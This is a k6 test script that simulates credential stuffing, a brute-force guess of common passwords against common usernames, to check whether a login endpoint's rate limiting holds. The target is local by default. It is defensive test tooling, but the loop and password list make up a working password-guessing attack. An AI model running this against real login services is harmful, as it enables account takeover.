import http from 'k6/http';
import { check, group, sleep } from 'k6';
import { Counter, Trend } from 'k6/metrics';

/**
 * S6 RIGOROUS: Credential Stuffing Attack Script
 * 
 * Purpose: Simulate brute-force login with common credentials
 * Defended By: C4 (Rate Limiting)
 * 
 * Configuration:
 *   ENDPOINT: http://api.svc.cluster.local:5000
 *   VUS: 5 (multiple attackers)
 *   DURATION: 60s (to trigger rate limit)
 * 
 * Metrics:
 *   credstuff_attempts_total: Total login attempts
 *   credstuff_ratelimited: 429 responses (blocked by rate limit) - GOOD
 *   credstuff_unauthorized: 401 responses (invalid credentials) - EXPECTED
 *   credstuff_success: 200 responses (account compromise) - BAD
 */

const credstuff_attempts_total = new Counter('credstuff_attempts_total');
const credstuff_ratelimited_total = new Counter('credstuff_ratelimited_total');
const credstuff_unauthorized_total = new Counter('credstuff_unauthorized_total');
const credstuff_success_total = new Counter('credstuff_success_total');
const credstuff_response_time = new Trend('credstuff_response_time');

// Common users (typical targets for credential stuffing)
const COMMON_USERS = [
  'alice',
  'bob',
  'admin',
  'root',
  'user',
  'test',
  'guest',
  'administrator',
];

// Top 100 common passwords (subset of rockyou.txt)
const COMMON_PASSWORDS = [
  '123456',
  'password',
  '12345678',
  'qwerty',
  '123456789',
  '12345',
  '1234567',
  '1234567890',
  '123123',
  'password123',
  '111111',
  'abc123',
  '000000',
  '1234',
  '654321',
  '123321',
  '666666',
  '999999',
  '121212',
  '112233',
  'admin',
  'admin123',
  'welcome',
  'monkey',
  '1q2w3e4r',
  '123454321',
  '555555',
  'lovely',
  '7777777',
  '888888',
  'shadow',
  'michael',
  '123123123',
  'superman',
  'batman',
  'trustno1',
  'sunshine',
  '654321',
  '7654321',
  '987654321',
];

export const options = {
  vus: Number(__ENV.VUS || 5),
  duration: __ENV.DURATION || '60s',
  insecureSkipTLSVerify: true,
  hosts: { 'realistic.local': '127.0.0.1' },
};

const SLEEP_MS = Number(__ENV.SLEEP_MS || 0);

export default function () {
  const authBase = __ENV.AUTH_URL || __ENV.ENDPOINT || 'http://localhost:30084';
  const targetPath = authBase.startsWith('https') ? '/auth/login' : '/login';
  const hostHeader = __ENV.HOST_HEADER || '';
  
  group('Credential Stuffing Attacks', () => {
    // Pick random user and password from common lists
    const user = COMMON_USERS[Math.floor(Math.random() * COMMON_USERS.length)];
    const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
    const url = `${authBase}${targetPath}`;
    
    credstuff_attempts_total.add(1);
    
    const payload = JSON.stringify({
      username: user,
      password: pass,
    });
    
    const response = http.post(url, payload, {
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'k6-attacker/credstuff',
        ...(hostHeader ? { Host: hostHeader } : {}),
      },
      tags: {
        attack_type: 'credstuff',
        endpoint: targetPath,
        phase: 'under_attack',
      },
      timeout: '5s',
    });
    
    credstuff_response_time.add(response.timings.duration, { status: response.status });
    
    // Classify responses
    if (response.status === 429) {
      // Rate limit triggered - this is good defense!
      credstuff_ratelimited_total.add(1);
      check(response, {
        'Rate limited (429)': (r) => r.status === 429,
      });
    } else if (response.status === 401 || response.status === 403) {
      // Invalid credentials - expected when credentials are not real
      credstuff_unauthorized_total.add(1);
      check(response, {
        'Unauthorized (401/403)': (r) => r.status === 401 || r.status === 403,
      });
    } else if (response.status === 200) {
      // Successful login - account compromise!
      credstuff_success_total.add(1);
      check(response, {
        'ACCOUNT COMPROMISED (200 OK) - CONTROL FAILED': (r) => false,
      });
    }
  });

  if (SLEEP_MS > 0) {
    sleep(SLEEP_MS / 1000);
  }
}

export function handleSummary(data) {
  const summary = {
    timestamp: new Date().toISOString(),
    attack_type: 'credstuff',
    summary_counters: {
      credstuff_attempts_total: data.metrics.credstuff_attempts_total ? data.metrics.credstuff_attempts_total.value : 0,
      credstuff_ratelimited_total: data.metrics.credstuff_ratelimited_total ? data.metrics.credstuff_ratelimited_total.value : 0,
      credstuff_unauthorized_total: data.metrics.credstuff_unauthorized_total ? data.metrics.credstuff_unauthorized_total.value : 0,
      credstuff_success_total: data.metrics.credstuff_success_total ? data.metrics.credstuff_success_total.value : 0,
    },
  };
  console.log(JSON.stringify(summary, null, 2));
  return { stdout: JSON.stringify(summary, null, 2) };
}
